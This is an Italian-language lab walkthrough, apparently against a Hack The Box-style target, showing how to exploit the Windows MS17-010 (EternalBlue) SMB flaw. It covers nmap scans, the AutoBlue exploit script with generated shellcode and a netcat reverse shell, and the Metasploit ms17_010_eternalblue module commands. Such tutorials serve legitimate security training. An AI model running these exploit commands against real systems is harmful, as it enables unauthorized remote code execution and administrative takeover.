# Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)



<figure><img src="../../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

AutoBlue ci consente di eseguire l'exploit manualmente.

## Scan Nmap per vedere OS e porta SMB

Faciamo uno scan concentrandoci sulla porta di SMB e con -O vogliamo sapere l'OS:

```
sudo nmap -sV -p 445 -O 10.10.10.12
```

<figure><img src="../../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

Windows Server 2008.

## Scan nmap per verificare se SMB è vulnerabile a EternalBlue

```
sudo nmap -sV -p 445  --script=smb-vuln-ms17-010 10.10.10.12
```

<figure><img src="../../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

Ci dice infatti che è VULNERABLE alla RCE vuln di MS SMBv1 servers (eternal blue).

## AutoBlue-MS17-010: Exploit manuale di EternalBlue

<figure><img src="../../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

Dobbiamo clonare il repository in una cartella:

<figure><img src="../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

Infatti è contenuto nella cartella una serie di script python per le varie versione di windows.

<figure><img src="../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

Prima di avviare gli script bisogna però installare i requisiti come indicato nel readme:

<figure><img src="../../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

Dobbiamo generare uno shellcode inserendo i nostri dati e quale versione (nel nostro caso Windows 7) vogliamo inserire dell'exploit.

<figure><img src="../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

Compiliamo i campi richiesti con le scelte:

<figure><img src="../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

Lo shellcode viene messo in raw format nel file sc\_x64\_msf.bin oppure il rispettivo x86, il file lo troviamo nella cartella:

<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

Avviamo il netcat listener

<figure><img src="../../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

Tornando alla cartella AutoBlue-MS17-010 (prima eravamo dentro la shellcode) dobbiamo ora eseguire l'exploit della versione di windows del nostro target, nel nostro caso Windows 7, e quindi rendiamo eseguibile il file con chmod +x.

<figure><img src="../../../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

```
python eternalblue_exploit7.py 10.10.10.12 shellcode/sc_x64.bin // perché il nostro target è x64
```

<figure><img src="../../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

Vediamo ora che effettivamente il target si è connesso alla nostra porta aperta tramite reverse shell.

## Exploit automatico di EternalBlue con MSF

```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.12 //target IP
exploit
```

<figure><img src="../../../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

Il modulo 3 serve per verificare se il target è vulnerabile a EternalBlue, ma noi sappiamo già che lo è quindi andiamo diretti con il modulo 0 che fa l'exploitation vera e propria.

<figure><img src="../../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

Automaticamente imposta la shell x64 e per noi va bene.

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (262).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (263).png" alt=""><figcaption></figcaption></figure>

Questo exploit in particolare è molto potente perché con un solo passaggio (l'uso di un solo modulo metasploit) abbiamo accesso con credenziali amministrative.

